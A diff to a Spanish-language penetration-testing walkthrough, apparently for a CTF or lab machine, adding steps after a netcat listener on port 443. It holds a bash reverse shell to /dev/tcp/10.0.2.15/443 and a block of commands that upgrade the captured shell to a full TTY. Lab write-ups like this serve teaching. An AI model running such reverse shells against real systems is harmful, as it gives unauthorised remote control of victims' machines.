@@ -49,7 +49,19 @@ Nos levantamos un listening con la herramienta netcat por el puerto 443 para pon
 
 <img width="549" height="272" alt="where11" src="https://github.com/user-attachments/assets/fa6773df-1de4-4609-a064-2576e638e5ba" />
 
+Nos lanzamos la típica reverse shell de bash > bash -c "bash -i >& /dev/tcp/10.0.2.15/443 0>&1"
+
 <img width="880" height="188" alt="where12" src="https://github.com/user-attachments/assets/e5403c82-5dc9-4905-9cf5-cb306329db51" />
+
+Y ¡Ganamos acceso a la máquina víctima!, realizaremos el tratamiento de la tty de la siguiente manera:
+
+```bash
+script /dev/null -c bash
+CTRL + Z
+stty raw -echo;fg
+reset xterm
+export TERM=xterm && export SHELL=bash
+```
 
 <img width="710" height="389" alt="where13" src="https://github.com/user-attachments/assets/a649aad4-3594-4d10-bc96-bec6309ec9cc" />
 
